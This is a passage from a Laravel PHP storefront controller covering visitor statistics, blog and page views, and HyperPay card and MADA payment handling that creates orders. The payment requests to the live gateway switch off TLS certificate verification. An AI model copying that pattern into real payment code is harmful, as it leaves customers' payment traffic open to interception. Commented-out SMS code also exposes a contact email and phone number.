<?php

namespace App\Http\Controllers\Front;

use App\Models\Cart;
use App\Models\Coupon;
use App\Models\Currency;
use App\Models\OrderTrack;
use App\Models\Pagesetting;
use App\Models\UserNotification;
use App\Models\VendorOrder;
use Config;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Str;
use Redirect;
use Stripe\Error\Card;
use URL;
use Validator;
use App\Models\Notification;
//use App\Http\Controllers\Vendor\NotificationController;

use App\Classes\GeniusMailer;
use App\Http\Controllers\Controller;
use App\Models\Blog;
use App\Models\BlogCategory;
use App\Models\Counter;
use App\Models\Generalsetting;
use App\Models\Order;
use App\Models\Product;
use App\Models\Subscriber;
use App\Models\User;
use Carbon\Carbon;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Session;
use InvalidArgumentException;
use Markury\MarkuryPost;

class FrontendController extends Controller
{
    public function __construct()
    {
        $this->auth_guests();
        if(isset($_SERVER['HTTP_REFERER'])){
            $referral = parse_url($_SERVER['HTTP_REFERER'], PHP_URL_HOST);
            if ($referral != $_SERVER['SERVER_NAME']){

                $brwsr = Counter::where('type','browser')->where('referral',$this->getOS());
                if($brwsr->count() > 0){
                    $brwsr = $brwsr->first();
                    $tbrwsr['total_count']= $brwsr->total_count + 1;
                    $brwsr->update($tbrwsr);
                }else{
                    $newbrws = new Counter();
                    $newbrws['referral']= $this->getOS();
                    $newbrws['type']= "browser";
                    $newbrws['total_count']= 1;
                    $newbrws->save();
                }

                $count = Counter::where('referral',$referral);
                if($count->count() > 0){
                    $counts = $count->first();
                    $tcount['total_count']= $counts->total_count + 1;
                    $counts->update($tcount);
                }else{
                    $newcount = new Counter();
                    $newcount['referral']= $referral;
                    $newcount['total_count']= 1;
                    $newcount->save();
                }
            }
        }else{
            $brwsr = Counter::where('type','browser')->where('referral',$this->getOS());
            if($brwsr->count() > 0){
                $brwsr = $brwsr->first();
                $tbrwsr['total_count']= $brwsr->total_count + 1;
                $brwsr->update($tbrwsr);
            }else{
                $newbrws = new Counter();
                $newbrws['referral']= $this->getOS();
                $newbrws['type']= "browser";
                $newbrws['total_count']= 1;
                $newbrws->save();
            }
        }
    }

    function getOS() {

        $user_agent     =   !empty($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : "Unknown";

        $os_platform    =   "Unknown OS Platform";

        $os_array       =   array(
            '/windows nt 10/i'     =>  'Windows 10',
            '/windows nt 6.3/i'     =>  'Windows 8.1',
            '/windows nt 6.2/i'     =>  'Windows 8',
            '/windows nt 6.1/i'     =>  'Windows 7',
            '/windows nt 6.0/i'     =>  'Windows Vista',
            '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
            '/windows nt 5.1/i'     =>  'Windows XP',
            '/windows xp/i'         =>  'Windows XP',
            '/windows nt 5.0/i'     =>  'Windows 2000',
            '/windows me/i'         =>  'Windows ME',
            '/win98/i'              =>  'Windows 98',
            '/win95/i'              =>  'Windows 95',
            '/win16/i'              =>  'Windows 3.11',
            '/macintosh|mac os x/i' =>  'Mac OS X',
            '/mac_powerpc/i'        =>  'Mac OS 9',
            '/linux/i'              =>  'Linux',
            '/ubuntu/i'             =>  'Ubuntu',
            '/iphone/i'             =>  'iPhone',
            '/ipod/i'               =>  'iPod',
            '/ipad/i'               =>  'iPad',
            '/android/i'            =>  'Android',
            '/blackberry/i'         =>  'BlackBerry',
            '/webos/i'              =>  'Mobile'
        );

        foreach ($os_array as $regex => $value) {

            if (preg_match($regex, $user_agent)) {
                $os_platform    =   $value;
            }

        }
        return $os_platform;
    }


// -------------------------------- HOME PAGE SECTION ----------------------------------------

	public function index(Request $request)
	{

        $this->code_image();
         if(!empty($request->reff))
         {
            $affilate_user = User::where('affilate_code','=',$request->reff)->first();
            if(!empty($affilate_user))
            {
                $gs = Generalsetting::findOrFail(1);
                if($gs->is_affilate == 1)
                {
                    Session::put('affilate', $affilate_user->id);
                    return redirect()->route('front.index');
                }

            }

         }
        $selectable = ['id','user_id','name','slug','features','colors','thumbnail','price','previous_price','attributes','size','size_price','discount_date'];
        $sliders = DB::table('sliders')->get();
        $top_small_banners = DB::table('banners')->where('type','=','TopSmall')->get();
        $ps = DB::table('pagesettings')->find(1);
        $feature_products =  Product::with('user')->where('featured','=',1)->where('status','=',1)->select($selectable)->orderBy('id','desc')->take(8)->get()->reject(function($item){

            if($item->user_id != 0){
              if($item->user->is_vendor != 2){
                return true;
              }
            }
            return false;

          });

	    return view('front.index',compact('ps','sliders','top_small_banners','feature_products'));
	}

    public function extraIndex()
    {
        $services = DB::table('services')->where('user_id','=',0)->get();
        $bottom_small_banners = DB::table('banners')->where('type','=','BottomSmall')->get();
        $large_banners = DB::table('banners')->where('type','=','Large')->get();
        $reviews =  DB::table('reviews')->get();
        $ps = DB::table('pagesettings')->find(1);
        $partners = DB::table('partners')->get();
        $selectable = ['id','user_id','name','slug','features','colors','thumbnail','price','previous_price','attributes','size','size_price','discount_date'];
        $discount_products =  Product::with('user')->where('is_discount','=',1)->where('status','=',1)->orderBy('id','desc')->take(8)->get()->reject(function($item){

            if($item->user_id != 0){
              if($item->user->is_vendor != 2){
                return true;
              }
            }
            return false;

          });
        $best_products = Product::with('user')->where('best','=',1)->where('status','=',1)->select($selectable)->orderBy('id','desc')->take(6)->get()->reject(function($item){

            if($item->user_id != 0){
              if($item->user->is_vendor != 2){
                return true;
              }
            }
            return false;

          });
        $top_products = Product::with('user')->where('top','=',1)->where('status','=',1)->select($selectable)->orderBy('id','desc')->take(8)->get()->reject(function($item){

            if($item->user_id != 0){
              if($item->user->is_vendor != 2){
                return true;
              }
            }
            return false;

          });
        $big_products = Product::with('user')->where('big','=',1)->where('status','=',1)->select($selectable)->orderBy('id','desc')->take(6)->get()->reject(function($item){

            if($item->user_id != 0){
              if($item->user->is_vendor != 2){
                return true;
              }
            }
            return false;

          });
        $hot_products =  Product::with('user')->where('hot','=',1)->where('status','=',1)->select($selectable)->orderBy('id','desc')->take(9)->get()->reject(function($item){

            if($item->user_id != 0){
              if($item->user->is_vendor != 2){
                return true;
              }
            }
            return false;

          });
        $latest_products =  Product::with('user')->where('latest','=',1)->where('status','=',1)->select($selectable)->orderBy('id','desc')->take(9)->get()->reject(function($item){

            if($item->user_id != 0){
              if($item->user->is_vendor != 2){
                return true;
              }
            }
            return false;

          });
        $trending_products =  Product::with('user')->where('trending','=',1)->where('status','=',1)->select($selectable)->orderBy('id','desc')->take(9)->get()->reject(function($item){

            if($item->user_id != 0){
              if($item->user->is_vendor != 2){
                return true;
              }
            }
            return false;

          });
        $sale_products =  Product::with('user')->where('sale','=',1)->where('status','=',1)->select($selectable)->orderBy('id','desc')->take(9)->get()->reject(function($item){

            if($item->user_id != 0){
              if($item->user->is_vendor != 2){
                return true;
              }
            }
            return false;

          });
        return view('front.extraindex',compact('ps','services','reviews','large_banners','bottom_small_banners','best_products','top_products','hot_products','latest_products','big_products','trending_products','sale_products','discount_products','partners'));
    }

// -------------------------------- HOME PAGE SECTION ENDS ----------------------------------------


// LANGUAGE SECTION

    public function language($id)
    {
        $this->code_image();
        Session::put('language', $id);
        cache()->forget('session_language');
        return redirect()->back();
    }

// LANGUAGE SECTION ENDS


// CURRENCY SECTION

    public function currency($id)
    {
        $this->code_image();
        if (Session::has('coupon')) {
            Session::forget('coupon');
            Session::forget('coupon_code');
            Session::forget('coupon_id');
            Session::forget('coupon_total');
            Session::forget('coupon_total1');
            Session::forget('already');
            Session::forget('coupon_percentage');
        }
        Session::put('currency', $id);
        cache()->forget('session_currency');
        return redirect()->back();
    }

// CURRENCY SECTION ENDS

    public function autosearch($slug)
    {
        if(mb_strlen($slug,'utf-8') > 1){
            $search = ' '.$slug;
            $prods = Product::where('status','=',1)->where('name', 'like', '%' . $search . '%')->orWhere('name', 'like', $slug . '%')->take(10)->get()->reject(function($item){

                if($item->user_id != 0){
                  if($item->user->is_vendor != 2){
                    return true;
                  }
                }
                    return false;
            });

            return view('load.suggest',compact('prods','slug'));
        }
        return "";
    }


// -------------------------------- BLOG SECTION ----------------------------------------

	public function blog(Request $request)
	{
        $this->code_image();
		$blogs = Blog::orderBy('created_at','desc')->paginate(9);
            if($request->ajax()){
                return view('front.pagination.blog',compact('blogs'));
            }
		return view('front.blog',compact('blogs'));
	}

    public function blogcategory(Request $request, $slug)
    {
        $this->code_image();
        $bcat = BlogCategory::where('slug', '=', str_replace(' ', '-', $slug))->first();
        $blogs = $bcat->blogs()->orderBy('created_at','desc')->paginate(9);
            if($request->ajax()){
                return view('front.pagination.blog',compact('blogs'));
            }
        return view('front.blog',compact('bcat','blogs'));
    }

    public function blogtags(Request $request, $slug)
    {
        $this->code_image();
        $blogs = Blog::where('tags', 'like', '%' . $slug . '%')->paginate(9);
            if($request->ajax()){
                return view('front.pagination.blog',compact('blogs'));
            }
        return view('front.blog',compact('blogs','slug'));
    }

    public function blogsearch(Request $request)
    {
        $this->code_image();
        $search = $request->search;
        $blogs = Blog::where('title', 'like', '%' . $search . '%')->orWhere('details', 'like', '%' . $search . '%')->paginate(9);
            if($request->ajax()){
                return view('front.pagination.blog',compact('blogs'));
            }
        return view('front.blog',compact('blogs','search'));
    }

    public function blogarchive(Request $request,$slug)
    {
        $this->code_image();
        $date = \Carbon\Carbon::parse($slug)->format('Y-m');
        $blogs = Blog::where('created_at', 'like', '%' . $date . '%')->paginate(9);
            if($request->ajax()){
                return view('front.pagination.blog',compact('blogs'));
            }
        return view('front.blog',compact('blogs','date'));
    }

    public function blogshow($id)
    {
        $this->code_image();
        $tags = null;
        $tagz = '';
        $bcats = BlogCategory::all();
        $blog = Blog::findOrFail($id);
        $blog->views = $blog->views + 1;
        $blog->update();
        $name = Blog::pluck('tags')->toArray();
        foreach($name as $nm)
        {
            $tagz .= $nm.',';
        }
        $tags = array_unique(explode(',',$tagz));

        $archives= Blog::orderBy('created_at','desc')->get()->groupBy(function($item){ return $item->created_at->format('F Y'); })->take(5)->toArray();
        $blog_meta_tag = $blog->meta_tag;
        $blog_meta_description = $blog->meta_description;
        return view('front.blogshow',compact('blog','bcats','tags','archives','blog_meta_tag','blog_meta_description'));
    }


// -------------------------------- BLOG SECTION ENDS----------------------------------------

// -------------------------------- FAQ SECTION ----------------------------------------
	public function faq()
	{
        $this->code_image();
        if(DB::table('generalsettings')->find(1)->is_faq == 0){
            return redirect()->back();
        }
        $faqs =  DB::table('faqs')->orderBy('id','desc')->get();
		return view('front.faq',compact('faqs'));
	}
// -------------------------------- FAQ SECTION ENDS----------------------------------------

// -------------------------------- PAGE SECTION ----------------------------------------
    public function page($slug)
    {
        $this->code_image();
        $page =  DB::table('pages')->where('slug',$slug)->first();
        if(empty($page))
        {
            return response()->view('errors.404')->setStatusCode(404);
        }

        return view('front.page',compact('page'));
    }
// -------------------------------- PAGE SECTION ENDS----------------------------------------




// -------------------------------- HYPERPAY SECTION ----------------------------------------
/*
    public function hyperpay($amount, $currency) {
    
        $price = $amount;
        $curr = $currency;
                        
        function request() {
        	$url = "https://test.oppwa.com/v1/checkouts";
        	$data = "entityId=API_KEY" .
                        "&amount=92.00".
                        "&currency=SAR".
                        "&paymentType=DB";
        
        	$ch = curl_init();
        	curl_setopt($ch, CURLOPT_URL, $url);
        	curl_setopt($ch, CURLOPT_HTTPHEADER, array(
                           'Authorization:Bearer API_KEY'));
        	curl_setopt($ch, CURLOPT_POST, 1);
        	curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);// this should be set to true in production
        	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        	$responseData = curl_exec($ch);
        	if(curl_errno($ch)) {
        		return curl_error($ch);
        	}
        	curl_close($ch);
        	return $responseData;
        }
        $responseData = request();
        
        $resArray = json_decode($responseData);
        
        $id = $resArray->id;
        
        return view('front.hyperpay',compact('id', 'price', 'curr'));
        
        
        
    }
*/

public function hyperpayReq($id, $merchantTransactionId) {
    
    //$request = new Illuminate\Http\Request($form);
    //$request = $form;
    
    if (Session::has('requestSession')) {
        $request = Session::get('requestSession');
        //dd($request);
    }
    
    //return redirect('https://oppwa.com/v1/checkouts/'.$id.'/payment');
    

    global $id1;
    $id1 = $id;
    
    global $pattern1;
    $pattern1 = "/^(000\.000\.|000\.100\.1|000\.[36])/";
    
    global $pattern2;
    $pattern2 = "/^(000\.400\.0[^3]|000\.400\.100)/";
    
    function request() {
        global $id1;
        
        $url = "https://oppwa.com/v1/checkouts/".$id1."/payment";
        $url .= "?entityId=API_KEY";
        
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
                           'Authorization:Bearer API_KEY'));
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);// this should be set to true in production
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $responseData = curl_exec($ch);
        if(curl_errno($ch)) {
        	return curl_error($ch);
        }
        curl_close($ch);
        return $responseData;
    }
    $responseData = request();
    
    $resArray = json_decode($responseData);
    
    $hyperRes = $resArray->result->code;
    
    global $paymentBrand;
    $paymentBrand = $resArray->paymentBrand;
    
    // ..................... success state ..................
    
    if((preg_match($pattern1, $hyperRes) == 1) || (preg_match($pattern2, $hyperRes) == 1)) {
        
        if (Session::has('currency')) 
        {
            $curr = Currency::find(Session::get('currency'));
        }
        else
        {
            $curr = Currency::where('is_default','=',1)->first();
        }
        
        $gs = Generalsetting::findOrFail(1);
        $oldCart = Session::get('cart');
        $cart = new Cart($oldCart);
        foreach($cart->items as $key => $prod)
        {
        if(!empty($prod['item']['license']) && !empty($prod['item']['license_qty']))
        {
                foreach($prod['item']['license_qty']as $ttl => $dtl)
                {
                    if($dtl != 0)
                    {
                        $dtl--;
                        $produc = Product::findOrFail($prod['item']['id']);
                        $temp = $produc->license_qty;
                        $temp[$ttl] = $dtl;
                        $final = implode(',', $temp);
                        $produc->license_qty = $final;
                        $produc->update();
                        $temp =  $produc->license;
                        $license = $temp[$ttl];
                        $oldCart = Session::has('cart') ? Session::get('cart') : null;
                        $cart = new Cart($oldCart);
                        $cart->updateLicense($prod['item']['id'],$license);  
                        Session::put('cart',$cart);
                        break;
                    }                    
                }
        }
        }
        
        $order = new Order;
        $success_url = action('Front\PaymentController@payreturn');
        $item_name = $gs->title." Order";
        $item_number = Str::random(10);
        if(is_null($request['user_id'])) {} else {
        $order['user_id'] = $request['user_id'];
        }
        $order['cart'] = utf8_encode(bzcompress(serialize($cart), 9)); 
        if(is_null($request['totalQty'])) {} else {
        $order['totalQty'] = $request['totalQty'];
        }
        if(is_null($request['total'])) {} else {
        $order['pay_amount'] = round($request['total'] / $curr->value, 2);
        }
        //if(is_null($request['method'])) {} else {
        $order['method'] = $paymentBrand;
        //}
        if(is_null($request['shipping'])) {} else {
        $order['shipping'] = $request['shipping'];
        }
        if(is_null($request['pickup_location'])) {} else {
        $order['pickup_location'] = $request['pickup_location'];
        }
        if(is_null($request['email'])) {} else {
        $order['customer_email'] = $request['email'];
        }
        if(is_null($request['name'])) {} else {
        $order['customer_name'] = $request['name'];
        }
        if(is_null($request['shipping_cost'])) {} else {
        $order['shipping_cost'] = $request['shipping_cost'];
        }
        if(is_null($request['packing_cost'])) {} else {
        $order['packing_cost'] = $request['packing_cost'];
        }
        if(is_null($request['tax'])) {} else {
        $order['tax'] = $request['tax'];
        }
        if(is_null($request['phone'])) {} else {
        $order['customer_phone'] = $request['phone'];
        }
        if(is_null($request['address'])) {} else {
        $order['customer_address'] = $request['address'];
        }
        if(is_null($request['customer_country'])) {} else {
        $order['customer_country'] = $request['customer_country'];
        }
        if(is_null($request['city'])) {} else {
        $order['customer_city'] = $request['city'];
        }
        if(is_null($request['zip'])) {} else {
        $order['customer_zip'] = $request['zip'];
        }
        if(is_null($request['shipping_email'])) {} else {
        $order['shipping_email'] = $request['shipping_email'];
        }
        if(is_null($request['shipping_name'])) {} else {
        $order['shipping_name'] = $request['shipping_name'];
        }
        if(is_null($request['shipping_phone'])) {} else {
        $order['shipping_phone'] = $request['shipping_phone'];
        }
        if(is_null($request['shipping_address'])) {} else {
        $order['shipping_address'] = $request['shipping_address'];
        }
        if(is_null($request['shipping_country'])) {} else {
        $order['shipping_country'] = $request['shipping_country'];
        }
        if(is_null($request['shipping_city'])) {} else {
        $order['shipping_city'] = $request['shipping_city'];
        }
        if(is_null($request['shipping_zip'])) {} else {
        $order['shipping_zip'] = $request['shipping_zip'];
        }
        if(is_null($request['order_notes'])) {} else {
        $order['order_note'] = $request['order_notes'];
        }
        if(is_null($request['coupon_code'])) {} else {
        $order['coupon_code'] = $request['coupon_code'];
        }
        if(is_null($request['coupon_discount'])) {} else {
        $order['coupon_discount'] = $request['coupon_discount'];
        }
        if(is_null($request['dp'])) {} else {
        $order['dp'] = $request['dp'];
        }
        $order['payment_status'] = "Completed";
        $order['order_number'] = $merchantTransactionId;
        $order['currency_sign'] = $curr->sign;
        $order['currency_value'] = $curr->value;
        if(is_null($request['vendor_shipping_id'])) {} else {
        $order['vendor_shipping_id'] = $request['vendor_shipping_id'];
        }
        if(is_null($request['vendor_packing_id'])) {} else {
        $order['vendor_packing_id'] = $request['vendor_packing_id'];
        }
        if (Session::has('affilate')) 
        {
            $val = $request['total'] / $curr->value;
            $val = $val / 100;
            $sub = $val * $gs->affilate_charge;
            $order['affilate_user'] = Session::get('affilate');
            $order['affilate_charge'] = $sub;
        }
        $order->save();
        
        $track = new OrderTrack;
        $track->title = 'Pending';
        $track->text = 'You have successfully placed your order.';
        $track->order_id = $order->id;
        $track->save();
        
        $notification = new Notification;
        $notification->order_id = $order->id;
        $notification->save();
        
        if($request['coupon_id'] != "")
        {
            $coupon = Coupon::findOrFail($request['coupon_id']);
            $coupon->used++;
            if($coupon->times != null)
            {
                $i = (int)$coupon->times;
                $i--;
                $coupon->times = (string)$i;
            }
            $coupon->update();

        }
        
        foreach($cart->items as $prod)
        {
            $x = (string)$prod['size_qty'];
            if(!empty($x))
            {
                $product = Product::findOrFail($prod['item']['id']);
                $x = (int)$x;
                $x = $x - $prod['qty'];
                $temp = $product->size_qty;
                $temp[$prod['size_key']] = $x;
                $temp1 = implode(',', $temp);
                $product->size_qty =  $temp1;
                $product->update();               
            }
        }
        
        foreach($cart->items as $prod)
        {
            $x = (string)$prod['stock'];
            if($x != null)
            {

                $product = Product::findOrFail($prod['item']['id']);
                $product->stock =  $prod['stock'];
                $product->update();  
                if($product->stock <= 5)
                {
                    $notification = new Notification;
                    $notification->product_id = $product->id;
                    $notification->save();                    
                }              
            }
        }
        
        $notf = null;

        foreach($cart->items as $prod)
        {
            if($prod['item']['user_id'] != 0)
            {
                $vorder =  new VendorOrder;
                $vorder->order_id = $order->id;
                $vorder->user_id = $prod['item']['user_id'];
                $notf[] = $prod['item']['user_id'];
                $vorder->qty = $prod['qty'];
                $vorder->price = $prod['price'];
                $vorder->order_number = $order->order_number;             
                $vorder->save();
            }

        }
        
        if(!empty($notf))
        {
            $users = array_unique($notf);
            foreach ($users as $user) {
                $notification = new UserNotification;
                $notification->user_id = $user;
                $notification->order_number = $order->order_number;
                $notification->save();    
            }
        }
        
        Session::put('temporder_id',$order->id);
        Session::put('tempcart',$cart);
        Session::forget('cart');
        Session::forget('already');
        Session::forget('coupon');
        Session::forget('coupon_total');
        Session::forget('coupon_total1');
        Session::forget('coupon_percentage');
        Session::forget('requestSession');
        
        //Sending Email To Buyer

        if($gs->is_smtp == 1)
        {
        $data = [
            'to' => $request['email'],
            'type' => "new_order",
            'cname' => $request['name'],
            'oamount' => "",
            'aname' => "",
            'aemail' => "",
            'wtitle' => "",
            'onumber' => $order->order_number,
        ];

        $mailer = new GeniusMailer();
        $mailer->sendAutoOrderMail($data,$order->id);            
        }
        else
        {
           $to = $request['email'];
           $subject = "Your Order Placed!!";
           $msg = "Hello ".$request['name']."!\nYou have placed a new order.\nYour order number is ".$order->order_number.".Please wait for your delivery. \nThank you.";
           $headers = "From: ".$gs->from_name."<".$gs->from_email.">";
           mail($to,$subject,$msg,$headers);            
        }
        
        //Sending Email To Admin
        
        if($gs->is_smtp == 1)
        {
            $data2 = [
                'to' => Pagesetting::find(1)->contact_email,
                'type' => "new_order_admin",
                'cname' => $request['name'],
                'oamount' => $request['totalQty'],
                'aname' => "",
                'aemail' => "",
                'wtitle' => "",
                'onumber' => $order->order_number,
            ];

            $mailer = new GeniusMailer();
            $mailer->sendAutoOrderMailAdmin($data2,$order->id);      
        }
        else
        {
           $to = Pagesetting::find(1)->contact_email;
           $subject = "New Order Recieved!!";
           $msg = "Hello Admin!\nYour store has recieved a new order.\nOrder Number is ".$order->order_number.".Please login to your panel to check. \nThank you.";
           $headers = "From: ".$gs->from_name."<".$gs->from_email.">";
           mail($to,$subject,$msg,$headers);
        }
        
        
        
//Sending SMS To Buyer
/*       
if(strpos($request['phone'], "966") !== false)
{
$msg = "موقع بريمادونا: \r\n رقم الطلب: ".$order->order_number;
$phone = str_replace("966 - ","966","".$request['phone']."");

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://www.msegat.com/gw/sendsms.php");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
curl_setopt($ch, CURLOPT_HEADER, TRUE);
curl_setopt($ch, CURLOPT_POST, TRUE);
$fields = <<<EOT
{
"userName": "primadonna.ksa@gmail.com",
"numbers": "$phone",
"userSender": "OTP",
"apiKey": "API_KEY",
"msg": "Pin Code is: xxxx"
}
EOT;
curl_setopt($ch, CURLOPT_POSTFIELDS, $fields);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
"Content-Type: application/json",));
$response = curl_exec($ch);
$info = curl_getinfo($ch);
}
*/

//Sending SMS To Customer Service
/*
if(strpos($request['phone'], "966") !== false)
{
$msg = "موقع بريمادونا: \r\n رقم الطلب: ".$order->order_number;
//$phone = str_replace("966 - ","966",$request['phone']);
$phone = "966533033568";

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://www.msegat.com/gw/sendsms.php");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
curl_setopt($ch, CURLOPT_HEADER, TRUE);
curl_setopt($ch, CURLOPT_POST, TRUE);
$fields = <<<EOT
{
"userName": "primadonna.ksa@gmail.com",
"numbers": "$phone",
"userSender": "PRIMADONNA",
"apiKey": "API_KEY",
"msg": "$msg"
}
EOT;
curl_setopt($ch, CURLOPT_POSTFIELDS, $fields);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
"Content-Type: application/json",));
$response = curl_exec($ch);
$info = curl_getinfo($ch);
}        
*/        
        
         
        //redirect()->route('sms.submit', ['orderNum' => $order->order_number, 'phoneCus' => $request['phone']]);
         
        return redirect($success_url)->with('success',"Successful Payment.");
        
        //return redirect('https://test.oppwa.com/v1/checkouts/'.$id1.'/payment');
        
    } 
    
    // ..................... failure state ..................
    
    else {
        
        //Session::forget('cart');
        Session::forget('already');
        Session::forget('coupon');
        Session::forget('coupon_total');
        Session::forget('coupon_total1');
        Session::forget('coupon_percentage');
        Session::forget('requestSession');
        
        return redirect()->route('front.cart')->with('unsuccess',"Payment Error, Contact with support.");
        //return redirect()->route('front.cart')->with('success',"You don't have any product to checkout.");
        
    }
    
        

}



public function hyperpayReqMada($id, $merchantTransactionId) {
    
    //$request = new Illuminate\Http\Request($form);
    //$request = $form;
    
    if (Session::has('requestSession')) {
        $request = Session::get('requestSession');
        //dd($request);
    }
    
    //return redirect('https://test.oppwa.com/v1/checkouts/'.$id.'/payment');
    

    global $id1;
    $id1 = $id;
    
    global $pattern1;
    $pattern1 = "/^(000\.000\.|000\.100\.1|000\.[36])/";
    
    global $pattern2;
    $pattern2 = "/^(000\.400\.0[^3]|000\.400\.100)/";
    
    function request() {
        global $id1;
        
        $url = "https://oppwa.com/v1/checkouts/".$id1."/payment";
        $url .= "?entityId=API_KEY";
        
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
                           'Authorization:Bearer API_KEY'));
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);// this should be set to true in production
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $responseData = curl_exec($ch);
        if(curl_errno($ch)) {
        	return curl_error($ch);
        }
        curl_close($ch);
        return $responseData;
    }
    $responseData = request();
    
    $resArray = json_decode($responseData);
    
    $hyperRes = $resArray->result->code;
    
    // ..................... success state ..................
    
    if((preg_match($pattern1, $hyperRes) == 1) || (preg_match($pattern2, $hyperRes) == 1)) {
        
        if (Session::has('currency')) 
        {
            $curr = Currency::find(Session::get('currency'));
        }
        else
        {
            $curr = Currency::where('is_default','=',1)->first();
        }
        
        $gs = Generalsetting::findOrFail(1);
        $oldCart = Session::get('cart');
        $cart = new Cart($oldCart);
        foreach($cart->items as $key => $prod)
        {
        if(!empty($prod['item']['license']) && !empty($prod['item']['license_qty']))
        {
                foreach($prod['item']['license_qty']as $ttl => $dtl)
                {
                    if($dtl != 0)
                    {
                        $dtl--;
                        $produc = Product::findOrFail($prod['item']['id']);
                        $temp = $produc->license_qty;
                        $temp[$ttl] = $dtl;
                        $final = implode(',', $temp);
                        $produc->license_qty = $final;
                        $produc->update();
                        $temp =  $produc->license;
                        $license = $temp[$ttl];
                        $oldCart = Session::has('cart') ? Session::get('cart') : null;
                        $cart = new Cart($oldCart);
                        $cart->updateLicense($prod['item']['id'],$license);  
                        Session::put('cart',$cart);
                        break;
                    }                    
                }
        }
        }
        
        $order = new Order;
        $success_url = action('Front\PaymentController@payreturn');
        $item_name = $gs->title." Order";
        $item_number = Str::random(10);
        if(is_null($request['user_id'])) {} else {
        $order['user_id'] = $request['user_id'];
        }
        $order['cart'] = utf8_encode(bzcompress(serialize($cart), 9)); 
        if(is_null($request['totalQty'])) {} else {
        $order['totalQty'] = $request['totalQty'];
        }
        if(is_null($request['total'])) {} else {
        $order['pay_amount'] = round($request['total'] / $curr->value, 2);
        }
        //if(is_null($request['method'])) {} else {
        $order['method'] = "MADA";
        //}
        if(is_null($request['shipping'])) {} else {
        $order['shipping'] = $request['shipping'];
        }
        if(is_null($request['pickup_location'])) {} else {
        $order['pickup_location'] = $request['pickup_location'];
        }
        if(is_null($request['email'])) {} else {
        $order['customer_email'] = $request['email'];
        }
        if(is_null($request['name'])) {} else {
        $order['customer_name'] = $request['name'];
        }
        if(is_null($request['shipping_cost'])) {} else {
        $order['shipping_cost'] = $request['shipping_cost'];
        }
        if(is_null($request['packing_cost'])) {} else {
        $order['packing_cost'] = $request['packing_cost'];
        }
        if(is_null($request['tax'])) {} else {
        $order['tax'] = $request['tax'];
        }
        if(is_null($request['phone'])) {} else {
        $order['customer_phone'] = $request['phone'];
        }
        if(is_null($request['address'])) {} else {
        $order['customer_address'] = $request['address'];
        }
        if(is_null($request['customer_country'])) {} else {
        $order['customer_country'] = $request['customer_country'];
        }
        if(is_null($request['city'])) {} else {
        $order['customer_city'] = $request['city'];
        }
        if(is_null($request['zip'])) {} else {
        $order['customer_zip'] = $request['zip'];
        }
        if(is_null($request['shipping_email'])) {} else {
        $order['shipping_email'] = $request['shipping_email'];
        }
        if(is_null($request['shipping_name'])) {} else {
        $order['shipping_name'] = $request['shipping_name'];
        }
        if(is_null($request['shipping_phone'])) {} else {
        $order['shipping_phone'] = $request['shipping_phone'];
        }
        if(is_null($request['shipping_address'])) {} else {
        $order['shipping_address'] = $request['shipping_address'];
        }
        if(is_null($request['shipping_country'])) {} else {
        $order['shipping_country'] = $request['shipping_country'];
        }
        if(is_null($request['shipping_city'])) {} else {
        $order['shipping_city'] = $request['shipping_city'];
        }
        if(is_null($request['shipping_zip'])) {} else {
        $order['shipping_zip'] = $request['shipping_zip'];
        }
        if(is_null($request['order_notes'])) {} else {
        $order['order_note'] = $request['order_notes'];
        }
        if(is_null($request['coupon_code'])) {} else {
        $order['coupon_code'] = $request['coupon_code'];
        }
        if(is_null($request['coupon_discount'])) {} else {
        $order['coupon_discount'] = $request['coupon_discount'];
        }
        if(is_null($request['dp'])) {} else {
        $order['dp'] = $request['dp'];
        }
        $order['payment_status'] = "Completed";
        $order['order_number'] = $merchantTransactionId;
        $order['currency_sign'] = $curr->sign;
        $order['currency_value'] = $curr->value;
        if(is_null($request['vendor_shipping_id'])) {} else {
        $order['vendor_shipping_id'] = $request['vendor_shipping_id'];
        }
        if(is_null($request['vendor_packing_id'])) {} else {
        $order['vendor_packing_id'] = $request['vendor_packing_id'];
        }
        if (Session::has('affilate')) 
        {
            $val = $request['total'] / $curr->value;
            $val = $val / 100;
            $sub = $val * $gs->affilate_charge;
            $order['affilate_user'] = Session::get('affilate');
            $order['affilate_charge'] = $sub;
        }
        $order->save();
        
        $track = new OrderTrack;
        $track->title = 'Pending';
        $track->text = 'You have successfully placed your order.';
        $track->order_id = $order->id;
        $track->save();
        
        $notification = new Notification;
        $notification->order_id = $order->id;
        $notification->save();
        
        if($request['coupon_id'] != "")
        {
            $coupon = Coupon::findOrFail($request['coupon_id']);
            $coupon->used++;
            if($coupon->times != null)
            {
                $i = (int)$coupon->times;
                $i--;
                $coupon->times = (string)$i;
            }
            $coupon->update();

        }
        
        foreach($cart->items as $prod)
        {
            $x = (string)$prod['size_qty'];
            if(!empty($x))
            {
                $product = Product::findOrFail($prod['item']['id']);
                $x = (int)$x;
                $x = $x - $prod['qty'];
                $temp = $product->size_qty;
                $temp[$prod['size_key']] = $x;
                $temp1 = implode(',', $temp);
                $product->size_qty =  $temp1;
                $product->update();               
            }
        }
        
        foreach($cart->items as $prod)
        {
